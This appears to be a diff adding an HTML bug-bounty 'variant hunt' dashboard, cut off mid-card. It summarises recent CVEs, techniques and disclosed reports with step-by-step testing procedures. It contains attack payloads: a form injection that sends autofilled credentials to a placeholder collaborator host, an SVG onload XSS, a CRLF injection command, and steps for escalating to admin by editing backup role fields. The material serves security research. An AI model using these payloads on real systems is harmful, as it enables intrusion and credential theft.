@@ -1,0 +1,587 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Variant Hunt Intel — 2026-11-19</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{--bg:#08090a;--surface:#111214;--border:#1e2024;--text:#e0e0e0;--muted:#888;--accent:#e4f222;--accent2:#22e4a6;--red:#ff4444;--orange:#ff8844;--blue:#4488ff;--purple:#aa66ff;--font:'JetBrains Mono',ui-monospace,monospace}
+body{font-family:var(--font);background:var(--bg);color:var(--text);line-height:1.6;font-size:14px}
+a{color:var(--accent);text-decoration:none}a:hover{text-decoration:underline}
+.container{max-width:1200px;margin:0 auto;padding:24px}
+h1{font-size:28px;color:var(--accent);margin-bottom:4px}
+.subtitle{color:var(--muted);font-size:13px;margin-bottom:32px}
+.stats{display:flex;gap:16px;margin-bottom:32px;flex-wrap:wrap}
+.stat{background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:16px 20px;min-width:120px}
+.stat-val{font-size:28px;font-weight:700;color:var(--accent)}
+.stat-label{font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:1px}
+.tabs{display:flex;gap:2px;margin-bottom:0;border-bottom:2px solid var(--border);overflow-x:auto}
+.tab{padding:10px 20px;cursor:pointer;color:var(--muted);border-bottom:2px solid transparent;margin-bottom:-2px;white-space:nowrap;font-size:13px;transition:all .2s}
+.tab:hover{color:var(--text)}
+.tab.active{color:var(--accent);border-bottom-color:var(--accent)}
+.panel{display:none;padding:24px 0}
+.panel.active{display:block}
+.card{background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:20px;margin-bottom:16px;position:relative}
+.card:hover{border-color:var(--accent);box-shadow:0 0 20px rgba(228,242,34,.05)}
+.card-header{display:flex;justify-content:space-between;align-items:flex-start;gap:12px;margin-bottom:12px}
+.card-title{font-size:16px;font-weight:700;color:#fff}
+.badge{font-size:11px;padding:3px 10px;border-radius:12px;font-weight:600;white-space:nowrap}
+.badge-cve{background:rgba(255,68,68,.15);color:var(--red)}
+.badge-technique{background:rgba(228,242,34,.15);color:var(--accent)}
+.badge-writeup{background:rgba(34,228,166,.15);color:var(--accent2)}
+.badge-critical{background:var(--red);color:#fff}
+.badge-high{background:var(--orange);color:#000}
+.badge-medium{background:var(--blue);color:#fff}
+.hunt-score{font-size:11px;color:var(--accent);font-weight:700}
+.meta{font-size:12px;color:var(--muted);margin-bottom:12px}
+.what,.why,.signal{margin-bottom:8px;font-size:13px}
+.what strong,.why strong,.signal strong{color:var(--accent)}
+.steps{background:#0a0b0d;border:1px solid var(--border);border-radius:6px;padding:16px;margin-top:12px}
+.steps h4{color:var(--accent);font-size:13px;margin-bottom:10px;text-transform:uppercase;letter-spacing:1px}
+.step{display:flex;gap:12px;margin-bottom:10px;align-items:flex-start}
+.step-num{background:var(--accent);color:#000;width:22px;height:22px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;flex-shrink:0;margin-top:2px}
+.step-text{font-size:12px;color:var(--text)}
+.step-text code{background:rgba(228,242,34,.1);color:var(--accent);padding:1px 5px;border-radius:3px;font-size:11px}
+.kill{margin-top:10px;padding:8px 12px;background:rgba(255,68,68,.08);border-left:3px solid var(--red);font-size:12px;color:var(--muted)}
+.kill strong{color:var(--red)}
+.chain{margin-top:10px;padding:8px 12px;background:rgba(170,102,255,.08);border-left:3px solid var(--purple);font-size:12px}
+.chain strong{color:var(--purple)}
+.flow{display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin:16px 0}
+.flow-step{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:8px 14px;font-size:12px;text-align:center}
+.flow-arrow{color:var(--accent);font-size:18px}
+.section-title{font-size:18px;font-weight:700;color:#fff;margin:24px 0 16px;padding-bottom:8px;border-bottom:1px solid var(--border)}
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(350px,1fr));gap:16px}
+@media(max-width:600px){.grid{grid-template-columns:1fr}.stats{flex-direction:column}.container{padding:12px}}
+.methodology{background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:24px;margin-bottom:24px}
+.methodology h3{color:var(--accent);font-size:15px;margin-bottom:12px}
+.methodology ol{padding-left:20px;margin-bottom:12px}
+.methodology li{margin-bottom:6px;font-size:13px}
+.methodology li code{background:rgba(228,242,34,.1);color:var(--accent);padding:1px 5px;border-radius:3px;font-size:11px}
+.target-matrix{width:100%;border-collapse:collapse;font-size:12px;margin-top:12px}
+.target-matrix th{text-align:left;padding:8px 12px;background:#0a0b0d;color:var(--accent);border:1px solid var(--border)}
+.target-matrix td{padding:8px 12px;border:1px solid var(--border);vertical-align:top}
+.target-matrix tr:hover td{background:rgba(228,242,34,.03)}
+.priority-tag{display:inline-block;font-size:10px;padding:2px 6px;border-radius:3px;font-weight:700}
+.p0{background:var(--red);color:#fff}.p1{background:var(--orange);color:#000}.p2{background:var(--blue);color:#fff}
+</style>
+</head>
+<body>
+<div class="container">
+<h1>Variant Hunt Intel Board</h1>
+<p class="subtitle">2026-11-19 refresh — 25 items from 13 sources since Oct 18 · kdairatchi</p>
+
+<div class="stats">
+<div class="stat"><div class="stat-val">8</div><div class="stat-label">CVEs</div></div>
+<div class="stat"><div class="stat-val">6</div><div class="stat-label">Techniques</div></div>
+<div class="stat"><div class="stat-val">8</div><div class="stat-label">Writeups</div></div>
+<div class="stat"><div class="stat-val">3</div><div class="stat-label">Reading</div></div>
+<div class="stat"><div class="stat-val">5/5</div><div class="stat-label">Top Hunt</div></div>
+</div>
+
+<div class="tabs">
+<div class="tab active" data-tab="methodology">Hunt Methodology</div>
+<div class="tab" data-tab="cves">CVEs (8)</div>
+<div class="tab" data-tab="techniques">Techniques (6)</div>
+<div class="tab" data-tab="writeups">H1 Writeups (8)</div>
+<div class="tab" data-tab="matrix">Target Matrix</div>
+</div>
+
+<!-- METHODOLOGY TAB -->
+<div class="panel active" id="methodology">
+
+<div class="section-title">Variant Hunt Pipeline — How to Turn Intel Into Bounties</div>
+
+<div class="flow">
+<div class="flow-step">1. Intel Drop</div><span class="flow-arrow">&rarr;</span>
+<div class="flow-step">2. Pattern Extract</div><span class="flow-arrow">&rarr;</span>
+<div class="flow-step">3. Target Match</div><span class="flow-arrow">&rarr;</span>
+<div class="flow-step">4. Fingerprint</div><span class="flow-arrow">&rarr;</span>
+<div class="flow-step">5. Probe</div><span class="flow-arrow">&rarr;</span>
+<div class="flow-step">6. Validate</div><span class="flow-arrow">&rarr;</span>
+<div class="flow-step">7. Report</div>
+</div>
+
+<div class="methodology">
+<h3>Step 1: Intel Drop (what just happened)</h3>
+<p style="font-size:13px;color:var(--muted);margin-bottom:12px">A researcher publishes a CVE, technique, or writeup. You read it. The question isn't "is this bug cool" — it's <strong style="color:var(--accent)">"does this pattern exist elsewhere?"</strong></p>
+<ol>
+<li>Read the writeup. Identify the <strong>root cause</strong>, not the symptom.</li>
+<li>Ask: what <strong>technology/framework/pattern</strong> causes this?</li>
+<li>Ask: which <strong>other products</strong> use the same tech?</li>
+<li>Ask: did the researcher find the <strong>complete</strong> attack, or did they leave paths unexplored?</li>
+</ol>
+</div>
+
+<div class="methodology">
+<h3>Step 2: Pattern Extract — Example: innerHTML XSS Without Equals</h3>
+<p style="font-size:13px;color:var(--muted);margin-bottom:12px">PortSwigger dropped this Nov 18. Here's how to variant-hunt it:</p>
+<ol>
+<li><strong>Root cause:</strong> innerHTML sink processes HTML where <code>=</code> is stripped/filtered — but the technique doesn't need <code>=</code></li>
+<li><strong>Pattern:</strong> Any app that sanitizes by blocking <code>=</code> in user input before writing to <code>innerHTML</code></li>
+<li><strong>Who does this:</strong> WAFs that strip <code>=</code>, custom sanitizers, CSP workarounds that allow innerHTML but block attributes</li>
+<li><strong>Grep your JS bundles:</strong> <code>grep -rn 'innerHTML' dist/ | grep -v node_modules</code></li>
+<li><strong>Grep your Caido traffic:</strong> look for responses where <code>=</code> gets stripped but <code>&lt;</code> and <code>&gt;</code> survive</li>
+</ol>
+<div class="steps">
+<h4>Exact Steps — Apply to Any Target</h4>
+<div class="step"><div class="step-num">1</div><div class="step-text">Download the target's main JS bundle: <code>curl -sL https://target/static/js/main.*.js -o main.js</code></div></div>
+<div class="step"><div class="step-num">2</div><div class="step-text">Find innerHTML sinks: <code>grep -n 'innerHTML\|insertAdjacentHTML\|document.write' main.js</code></div></div>
+<div class="step"><div class="step-num">3</div><div class="step-text">Trace backward from each sink — does user input (URL params, postMessage, hash) flow into it?</div></div>
+<div class="step"><div class="step-num">4</div><div class="step-text">If yes: check if <code>=</code> is filtered in that path. Test with <code>?param=test"onmouseover</code> — does the <code>=</code> disappear?</div></div>
+<div class="step"><div class="step-num">5</div><div class="step-text">If <code>=</code> is stripped: apply PortSwigger's equals-free payload from the writeup</div></div>
+<div class="step"><div class="step-num">6</div><div class="step-text">Verify JS execution in browser. Capture screenshot. Done.</div></div>
+</div>
+<div class="kill"><strong>Kill signal:</strong> If the target uses a framework with auto-escaping (React, Angular default) and no <code>dangerouslySetInnerHTML</code> / <code>[innerHTML]</code> bindings, move on.</div>
+</div>
+
+<div class="methodology">
+<h3>Step 3: Pattern Extract — Example: Backup Restore Privilege Escalation</h3>
+<p style="font-size:13px;color:var(--muted);margin-bottom:12px">Weblate Critical on H1. Backup import preserves role data = admin upgrade.</p>
+<ol>
+<li><strong>Root cause:</strong> Import/restore function deserializes role information without validating against current user's permissions</li>
+<li><strong>Pattern:</strong> Any app with project/team backup + restore that includes user roles in the export</li>
+<li><strong>Who does this:</strong> Project management tools, CI/CD platforms, collaboration apps, any multi-tenant SaaS with import/export</li>
+</ol>
+<div class="steps">
+<h4>Exact Steps — Apply to Any Target</h4>
+<div class="step"><div class="step-num">1</div><div class="step-text">Find backup/export feature. Create a project/workspace as a low-privilege user.</div></div>
+<div class="step"><div class="step-num">2</div><div class="step-text">Export/backup the project. Download the file (usually ZIP with JSON/YAML config).</div></div>
+<div class="step"><div class="step-num">3</div><div class="step-text">Unzip. Search for role fields: <code>grep -ri 'role\|admin\|permission\|privilege' *.json *.yaml</code></div></div>
+<div class="step"><div class="step-num">4</div><div class="step-text">Modify role field: change <code>"role": "member"</code> to <code>"role": "admin"</code> (or equivalent)</div></div>
+<div class="step"><div class="step-num">5</div><div class="step-text">Re-zip. Import/restore the modified backup.</div></div>
+<div class="step"><div class="step-num">6</div><div class="step-text">Check: did your privilege level change? Can you now access admin functions?</div></div>
+<div class="step"><div class="step-num">7</div><div class="step-text">If yes: verify from a second account that the role change persists. Capture both states.</div></div>
+</div>
+<div class="kill"><strong>Kill signal:</strong> If the import function strips role/permission fields, or if roles are assigned server-side from the authenticated user's current permissions rather than the import data, it's patched.</div>
+</div>
+
+<div class="methodology">
+<h3>Step 4: Pattern Extract — Example: Appliance Pre-Auth RCE (watchTowr Pattern)</h3>
+<p style="font-size:13px;color:var(--muted);margin-bottom:12px">Barracuda, PaperCut, Citrix, F5 — four different vendors, same pattern: network appliances with pre-auth RCE.</p>
+<ol>
+<li><strong>Root cause:</strong> Enterprise network appliances expose management interfaces with pre-auth vulnerabilities</li>
+<li><strong>Pattern:</strong> Vendor patches one CVE but the underlying codebase has the same anti-pattern elsewhere</li>
+<li><strong>Variant hunt approach:</strong> When a CVE drops for Vendor X, check: (a) did the patch fix the root cause or just the specific path? (b) are there adjacent endpoints with the same pattern?</li>
+</ol>
+<div class="steps">
+<h4>Exact Steps — Appliance Variant Hunting</h4>
+<div class="step"><div class="step-num">1</div><div class="step-text">Read the full writeup (watchTowr is gold for this — they always explain the root cause)</div></div>
+<div class="step"><div class="step-num">2</div><div class="step-text">Identify the vulnerable code pattern (e.g., unsanitized header → eval, path traversal in file param)</div></div>
+<div class="step"><div class="step-num">3</div><div class="step-text">Download the patch diff: <code>diff old_firmware new_firmware</code> — what exactly changed?</div></div>
+<div class="step"><div class="step-num">4</div><div class="step-text">Search the rest of the codebase for the same pattern the patch fixed</div></div>
+<div class="step"><div class="step-num">5</div><div class="step-text">If you find it: that's your variant. Build a PoC against the unpatched path.</div></div>
+<div class="step"><div class="step-num">6</div><div class="step-text">Check other products from the same vendor — shared codebases are common (e.g., Citrix Gateway / NetScaler / ADC)</div></div>
+</div>
+<div class="chain"><strong>Chain opportunity:</strong> Pre-auth file read (Atlassian CVE-2026-21589) → read DB config → connect to DB → dump admin creds → full compromise. This chain doesn't need a separate RCE if file read gives you secrets.</div>
+</div>
+
+<div class="methodology">
+<h3>Step 5: Pattern Extract — Example: Image Processing Memory Corruption</h3>
+<p style="font-size:13px;color:var(--muted);margin-bottom:12px">Basecamp Critical — TIFF/JPEG heap overflow in image upload. Heartbleed-era class of bug, still alive in 2026.</p>
+<ol>
+<li><strong>Root cause:</strong> Server-side image processing (resize, thumbnail, format conversion) with libraries that have heap corruption bugs</li>
+<li><strong>Who is affected:</strong> Any target that processes uploaded images server-side — which is basically everyone</li>
+<li><strong>Key libraries:</strong> ImageMagick, libvips, Sharp (Node.js), Pillow (Python), GD (PHP)</li>
+</ol>
+<div class="steps">
+<h4>Exact Steps — Image Processing Fuzzing</h4>
+<div class="step"><div class="step-num">1</div><div class="step-text">Find image upload endpoints: avatar, profile pic, attachments, media library</div></div>
+<div class="step"><div class="step-num">2</div><div class="step-text">Fingerprint the processing library: upload a valid image, check response headers, error messages, or EXIF in output</div></div>
+<div class="step"><div class="step-num">3</div><div class="step-text">Check known CVEs for that library version: <code>python3 tools/cve_surface_mapper.py --product imagemagick</code></div></div>
+<div class="step"><div class="step-num">4</div><div class="step-text">Upload crafted images: oversized TIFF headers, malformed JPEG markers, polyglot PNG/SVG</div></div>
+<div class="step"><div class="step-num">5</div><div class="step-text">Watch for: 500 errors (crash), unusual response timing (hang), truncated responses (memory corruption)</div></div>
+<div class="step"><div class="step-num">6</div><div class="step-text">If crash confirmed: escalate to memory read (leak secrets) or write (code execution)</div></div>
+</div>
+<div class="kill"><strong>Kill signal:</strong> If images are processed client-side only (browser resize before upload) or via a managed CDN service (Cloudinary, imgix) with no server-side processing, move on.</div>
+</div>
+
+<div class="methodology">
+<h3>Step 6: CSP Credential Theft — Turning Defense Into Offense</h3>
+<p style="font-size:13px;color:var(--muted);margin-bottom:12px">PortSwigger Nov 11. CSP's <code>form-action</code> directive doesn't fall back to <code>default-src</code>. Inject a form + meta refresh = steal creds without JS.</p>
+<div class="steps">
+<h4>Exact Steps</h4>
+<div class="step"><div class="step-num">1</div><div class="step-text">Find any reflected HTML injection on the target (even with strict CSP blocking scripts)</div></div>
+<div class="step"><div class="step-num">2</div><div class="step-text">Check the CSP header: <code>curl -sI https://target/ | grep -i content-security-policy</code></div></div>
+<div class="step"><div class="step-num">3</div><div class="step-text">Look for: missing <code>form-action</code> directive, or <code>form-action</code> set to <code>*</code></div></div>
+<div class="step"><div class="step-num">4</div><div class="step-text">If missing/permissive: inject <code>&lt;form action="https://YOUR-COLLAB/x"&gt;&lt;input name=username&gt;&lt;input name=password&gt;&lt;/form&gt;&lt;meta http-equiv="refresh" content="0"&gt;</code></div></div>
+<div class="step"><div class="step-num">5</div><div class="step-text">The browser auto-submits the form with any autofilled credentials to your server</div></div>
+<div class="step"><div class="step-num">6</div><div class="step-text">Check your Collaborator/Interactsh for the POST with stolen creds</div></div>
+</div>
+<div class="chain"><strong>Chain:</strong> This upgrades ANY reflected HTML injection from "informational" to "credential theft" on targets without <code>form-action</code> in CSP. Re-check every parked HTML injection lead.</div>
+</div>
+
+</div>
+
+<!-- CVEs TAB -->
+<div class="panel" id="cves">
+<div class="section-title">CVEs — Sorted by Hunt Value</div>
+<div class="grid">
+
+<div class="card">
+<div class="card-header">
+<div class="card-title">CVE-2026-21589 — Atlassian Pre-Auth File Read</div>
+<div><span class="badge badge-cve">CVE</span> <span class="badge badge-critical">CRITICAL</span></div>
+</div>
+<div class="meta">2026-10-06 · watchTowr · <span class="hunt-score">Hunt: 5/5</span></div>
+<div class="what"><strong>What:</strong> Pre-auth arbitrary file read across Jira, Confluence, Bitbucket. Path traversal.</div>
+<div class="why"><strong>Why:</strong> Leaks dbconfig.xml, secrets, internal configs. Chains to full compromise.</div>
+<div class="signal"><strong>Probe:</strong> Path traversal per watchTowr writeup on any Atlassian instance.</div>
+</div>
+
+<div class="card">
+<div class="card-header">
+<div class="card-title">CVE-2026-116606 — Barracuda ESG Pre-Auth Root RCE</div>
+<div><span class="badge badge-cve">CVE</span> <span class="badge badge-critical">CRITICAL</span></div>
+</div>
+<div class="meta">2026-11-05 · watchTowr · <span class="hunt-score">Hunt: 4/5</span></div>
+<div class="what"><strong>What:</strong> Two chained pre-auth bugs = remote root on Barracuda Email Security Gateway.</div>
+<div class="why"><strong>Why:</strong> Email perimeter appliance. Pre-auth root = all inbound/outbound email compromised.</div>
+<div class="signal"><strong>Probe:</strong> Shodan: <code>Barracuda "Email Security Gateway"</code></div>
+</div>
+
+<div class="card">
+<div class="card-header">
+<div class="card-title">CVE-2026-94127 — F5 BIG-IP Unauth Heap RCE</div>
+<div><span class="badge badge-cve">CVE</span> <span class="badge badge-critical">CRITICAL</span></div>
+</div>
+<div class="meta">2026-09-23 · watchTowr · <span class="hunt-score">Hunt: 4/5</span></div>
+<div class="what"><strong>What:</strong> Heap overflow in Auth header handler on BIG-IP. Trivially reachable.</div>
+<div class="why"><strong>Why:</strong> BIG-IP is load balancer for most enterprises. Auth header = every request reaches it.</div>
+<div class="signal"><strong>Probe:</strong> Shodan for BIG-IP. <code>nuclei -t cves/2026/CVE-2026-94127.yaml</code></div>
+</div>
+
+<div class="card">
+<div class="card-header">
+<div class="card-title">CVE-2026-82077 — PaperCut Pre-Auth RCE Chain</div>
+<div><span class="badge badge-cve">CVE</span> <span class="badge badge-critical">CRITICAL</span></div>
+</div>
+<div class="meta">2026-10-09 · watchTowr · <span class="hunt-score">Hunt: 4/5</span></div>
+<div class="what"><strong>What:</strong> Pre-auth RCE + three patch bypasses. Prior fixes incomplete.</div>
+<div class="why"><strong>Why:</strong> Shallow patches = variant opportunity. Common in edu/enterprise.</div>
+<div class="signal"><strong>Probe:</strong> Patch diff WT-2026-0141-0144. Shodan for PaperCut.</div>
+</div>
+
+<div class="card">
+<div class="card-header">
+<div class="card-title">CVE-2026-49980 — Rclone Unauth RCE</div>
+<div><span class="badge badge-cve">CVE</span> <span class="badge badge-high">HIGH</span></div>
+</div>
+<div class="meta">2026-11-19 · nuclei-templates · <span class="hunt-score">Hunt: 4/5</span></div>
+<div class="what"><strong>What:</strong> Rclone 1.46.0–1.74.2 RCE when <code>--rc-serve</code> flag is used. No auth.</div>
+<div class="why"><strong>Why:</strong> Cloud backup infra. If exposed, full RCE on the backup server.</div>
+<div class="signal"><strong>Probe:</strong> Shodan port 5572. <code>nuclei -t cves/2026/CVE-2026-49980.yaml</code></div>
+</div>
+
+<div class="card">
+<div class="card-header">
+<div class="card-title">CVE-2026-88771 — Citrix NetScaler PreAuth CmdInj</div>
+<div><span class="badge badge-cve">CVE</span> <span class="badge badge-critical">CRITICAL</span></div>
+</div>
+<div class="meta">2026-09-28 · watchTowr · <span class="hunt-score">Hunt: 4/5</span></div>
+<div class="what"><strong>What:</strong> Pre-auth command injection in NetScaler. Part of a series.</div>
+<div class="why"><strong>Why:</strong> NetScaler is perimeter. Citrix patches deploy slow = long exploitation window.</div>
+<div class="signal"><strong>Probe:</strong> Shodan for NetScaler. Check patch version.</div>
+</div>
+
+<div class="card">
+<div class="card-header">
+<div class="card-title">CVE-2026-110372 — OttoKit Privilege Escalation (9.8)</div>
+<div><span class="badge badge-cve">CVE</span> <span class="badge badge-critical">CRITICAL</span></div>
+</div>
+<div class="meta">2026-10-18 · NVD · <span class="hunt-score">Hunt: 3/5</span></div>
+<div class="what"><strong>What:</strong> Incorrect privilege assignment in SureTriggers WP plugin. CVSS 9.8.</div>
+<div class="why"><strong>Why:</strong> WP automation plugin. If your targets use it, free priv esc.</div>
+<div class="signal"><strong>Probe:</strong> <code>wpscan --enumerate p</code> for SureTriggers/OttoKit.</div>
+</div>
+
+<div class="card">
+<div class="card-header">
+<div class="card-title">CVE-2026-109618/109619 — PHP2Shell</div>
+<div><span class="badge badge-cve">CVE</span> <span class="badge badge-high">HIGH</span></div>
+</div>
+<div class="meta">2026-10-22 · Intigriti · <span class="hunt-score">Hunt: 4/5</span></div>
+<div class="what"><strong>What:</strong> PHP filter chain exploitation = RCE on any PHP target with file inclusion.</div>
+<div class="why"><strong>Why:</strong> Most underexplored pre-auth RCE vector in PHP. Intigriti confirmed real-world impact.</div>
+<div class="signal"><strong>Probe:</strong> Any PHP target with <code>php://filter</code> reachable. See att-php2shell target dir.</div>
+</div>
+
+</div>
+</div>
+
+<!-- TECHNIQUES TAB -->
+<div class="panel" id="techniques">
+<div class="section-title">Techniques — New Attack Patterns</div>
+
+<div class="card">
+<div class="card-header">
+<div class="card-title">XSS in innerHTML Without Equals</div>
+<div><span class="badge badge-technique">TECHNIQUE</span> <span class="hunt-score">Hunt: 5/5</span></div>
+</div>
+<div class="meta">2026-11-18 · PortSwigger Research</div>
+<div class="what"><strong>What:</strong> Achieves code execution through innerHTML sinks without the <code>=</code> character.</div>
+<div class="why"><strong>Why:</strong> Defeats every filter that blocks <code>=</code>. innerHTML is the #1 DOM XSS sink.</div>
+<div class="steps">
+<h4>How to Hunt This</h4>
+<div class="step"><div class="step-num">1</div><div class="step-text">Grep target JS for <code>innerHTML</code> / <code>insertAdjacentHTML</code></div></div>
+<div class="step"><div class="step-num">2</div><div class="step-text">Trace data flow: does user input reach the sink?</div></div>
+<div class="step"><div class="step-num">3</div><div class="step-text">Test: inject <code>"onmouseover</code> — does the <code>=</code> get stripped?</div></div>
+<div class="step"><div class="step-num">4</div><div class="step-text">If yes: use the equals-free technique from the PortSwigger writeup</div></div>
+</div>
+<div class="chain"><strong>Re-test:</strong> ArenaNet GW3 DOM XSS was killed because URL params get URL-encoded. This technique may bypass that.</div>
+</div>
+
+<div class="card">
+<div class="card-header">
+<div class="card-title">Credential Theft Through CSP</div>
+<div><span class="badge badge-technique">TECHNIQUE</span> <span class="hunt-score">Hunt: 4/5</span></div>
+</div>
+<div class="meta">2026-11-11 · PortSwigger Research</div>
+<div class="what"><strong>What:</strong> CSP <code>form-action</code> doesn't inherit from <code>default-src</code>. Inject form + meta refresh = steal creds without JS.</div>
+<div class="why"><strong>Why:</strong> Upgrades ANY reflected HTML injection to credential theft if <code>form-action</code> is missing from CSP.</div>
+<div class="steps">
+<h4>How to Hunt This</h4>
+<div class="step"><div class="step-num">1</div><div class="step-text">Find reflected HTML injection (even without JS execution)</div></div>
+<div class="step"><div class="step-num">2</div><div class="step-text">Check CSP: <code>curl -sI https://target/ | grep content-security-policy</code></div></div>
+<div class="step"><div class="step-num">3</div><div class="step-text">If no <code>form-action</code> directive: inject form pointing to Collaborator</div></div>
+<div class="step"><div class="step-num">4</div><div class="step-text">Browser autofills creds and auto-submits on page load</div></div>
+</div>
+</div>
+
+<div class="card">
+<div class="card-header">
+<div class="card-title">HTTP Header Injection → Critical With AI Prompt</div>
+<div><span class="badge badge-technique">TECHNIQUE</span> <span class="hunt-score">Hunt: 4/5</span></div>
+</div>
+<div class="meta">2026-11-04 · PortSwigger Research</div>
+<div class="what"><strong>What:</strong> Escalate HTTP header injection from medium to critical using LLM-assisted exploitation chains.</div>
+<div class="why"><strong>Why:</strong> Header injection is usually medium. This shows how to chain it to critical impact.</div>
+<div class="steps">
+<h4>How to Hunt This</h4>
+<div class="step"><div class="step-num">1</div><div class="step-text">Find CRLF injection: <code>curl -v "https://target/path%0d%0aX-Injected: true"</code></div></div>
+<div class="step"><div class="step-num">2</div><div class="step-text">If CRLF works: inject response splitting headers</div></div>
+<div class="step"><div class="step-num">3</div><div class="step-text">Chain to: cache poisoning, session fixation, or XSS via injected response body</div></div>
+</div>
+</div>
+
+<div class="card">
+<div class="card-header">
+<div class="card-title">SVG Injection — Scalable Vector Grief</div>
+<div><span class="badge badge-technique">TECHNIQUE</span> <span class="hunt-score">Hunt: 3/5</span></div>
+</div>
+<div class="meta">2026-10-27 · PortSwigger Research</div>
+<div class="what"><strong>What:</strong> SVG uploads bypass image validation. Served inline = JS execution.</div>
+<div class="why"><strong>Why:</strong> SVG widely allowed in image uploads. If served with <code>image/svg+xml</code> without <code>Content-Disposition: attachment</code> = XSS.</div>
+<div class="steps">
+<h4>How to Hunt This</h4>
+<div class="step"><div class="step-num">1</div><div class="step-text">Find image upload: avatar, media library, attachments</div></div>
+<div class="step"><div class="step-num">2</div><div class="step-text">Upload: <code>&lt;svg onload="alert(1)"&gt;&lt;/svg&gt;</code> as .svg file</div></div>
+<div class="step"><div class="step-num">3</div><div class="step-text">Check response headers on served file: <code>curl -sI https://target/uploads/file.svg</code></div></div>
+<div class="step"><div class="step-num">4</div><div class="step-text">If <code>Content-Type: image/svg+xml</code> + no <code>attachment</code> → XSS confirmed</div></div>
+</div>
+</div>
+
+<div class="card">
+<div class="card-header">
+<div class="card-title">CSPT to Organization Modification</div>
+<div><span class="badge badge-technique">TECHNIQUE</span> <span class="hunt-score">Hunt: 4/5</span></div>
+</div>
+<div class="meta">2026-11-19 · Medium</div>
+<div class="what"><strong>What:</strong> Client-side path traversal chained to org-level API endpoint. One click = full org control.</div>
+<div class="why"><strong>Why:</strong> CSPT is our research focus. This proves the chain to org-level impact.</div>
+</div>
+
+<div class="card">
+<div class="card-header">
+<div class="card-title">Fuzzers vs AI: Fuzzilli vs BigSleep</div>
+<div><span class="badge badge-technique">TECHNIQUE</span> <span class="hunt-score">Hunt: 2/5</span></div>
+</div>
+<div class="meta">2026-10-27 · Project Zero</div>
+<div class="what"><strong>What:</strong> P0 data-driven comparison of grammar fuzzing vs LLM-based bug finding on JS engines.</div>
+<div class="why"><strong>Why:</strong> Methodology insight. Numbers on what works. No hype.</div>
+</div>
+
+</div>
+
+<!-- WRITEUPS TAB -->
+<div class="panel" id="writeups">
+<div class="section-title">H1 Disclosed Reports — Hunt Patterns</div>
+<div class="grid">
+
+<div class="card">
+<div class="card-header">
+<div class="card-title">Basecamp — Heap Overflow via Image Upload</div>
+<div><span class="badge badge-writeup">H1</span> <span class="badge badge-critical">CRITICAL</span></div>
+</div>
+<div class="meta">2026-11-17 · basecamp · <span class="hunt-score">Hunt: 5/5</span></div>
+<div class="what"><strong>Pattern:</strong> Server-side image processing with heap corruption.</div>
+<div class="signal"><strong>Apply to:</strong> Every target with image upload. Fuzz with crafted TIFF/JPEG.</div>
+</div>
+
+<div class="card">
+<div class="card-header">
+<div class="card-title">Weblate — Priv Esc via Backup Restore</div>
+<div><span class="badge badge-writeup">H1</span> <span class="badge badge-critical">CRITICAL</span></div>
+</div>
+<div class="meta">2026-11-15 · weblate · <span class="hunt-score">Hunt: 5/5</span></div>
+<div class="what"><strong>Pattern:</strong> Backup import preserves role data = admin upgrade.</div>
+<div class="signal"><strong>Apply to:</strong> Any SaaS with project import/export/backup that includes config data.</div>
+</div>
+
+<div class="card">
+<div class="card-header">
+<div class="card-title">Basecamp — Cross-Account Stored XSS</div>
+<div><span class="badge badge-writeup">H1</span> <span class="badge badge-high">HIGH</span></div>
+</div>
+<div class="meta">2026-11-13 · basecamp · <span class="hunt-score">Hunt: 4/5</span></div>
+<div class="what"><strong>Pattern:</strong> Stored XSS that crosses account boundaries via shared content.</div>
+<div class="signal"><strong>Apply to:</strong> Multi-tenant apps. Test XSS in shared/cross-org rendering contexts.</div>
+</div>
+
+<div class="card">
+<div class="card-header">
+<div class="card-title">Node.js — HTTP/2 Stream UAF Memory Leak</div>
+<div><span class="badge badge-writeup">H1</span> <span class="badge badge-high">HIGH</span></div>
+</div>
+<div class="meta">2026-11-12 · nodejs · <span class="hunt-score">Hunt: 4/5</span></div>
+<div class="what"><strong>Pattern:</strong> HTTP/2 stream teardown race leaks freed memory. Heartbleed-class.</div>
+<div class="signal"><strong>Apply to:</strong> Any Node.js target using HTTP/2. Test concurrent stream create/teardown.</div>
+</div>
+
+<div class="card">
+<div class="card-header">
+<div class="card-title">Essity — LFI via ABCpdf</div>
+<div><span class="badge badge-writeup">H1</span> <span class="badge badge-high">HIGH</span></div>
+</div>
+<div class="meta">2026-11-18 · essity · <span class="hunt-score">Hunt: 4/5</span></div>
+<div class="what"><strong>Pattern:</strong> PDF generation library processes user paths = arbitrary file read.</div>
+<div class="signal"><strong>Apply to:</strong> Any .NET target with PDF export. Check for ABCpdf, wkhtmltopdf, Puppeteer.</div>
+</div>
+
+<div class="card">
+<div class="card-header">
+<div class="card-title">GitHub — CSRF Deletes Integration Creds</div>
+<div><span class="badge badge-writeup">H1</span> <span class="badge badge-medium">MEDIUM</span></div>
+</div>
+<div class="meta">2026-11-18 · github · <span class="hunt-score">Hunt: 3/5</span></div>
+<div class="what"><strong>Pattern:</strong> CSRF on destructive endpoint (credential deletion).</div>
+<div class="signal"><strong>Apply to:</strong> Settings pages with delete actions for integrations/tokens.</div>
+</div>
+
+<div class="card">
+<div class="card-header">
+<div class="card-title">Arc — Unauth RPC Process Termination</div>
+<div><span class="badge badge-writeup">H1</span> <span class="badge badge-high">HIGH</span></div>
+</div>
+<div class="meta">2026-11-15 · arc-bbp · <span class="hunt-score">Hunt: 3/5</span></div>
+<div class="what"><strong>Pattern:</strong> Desktop app exposes unauthenticated RPC endpoints.</div>
+<div class="signal"><strong>Apply to:</strong> Desktop apps with IPC/RPC. Electron, WebView2, custom protocols.</div>
+</div>
+
+<div class="card">
+<div class="card-header">
+<div class="card-title">Discourse — Notification Reactions IDOR</div>
+<div><span class="badge badge-writeup">H1</span> <span class="badge badge-high">HIGH</span></div>
+</div>
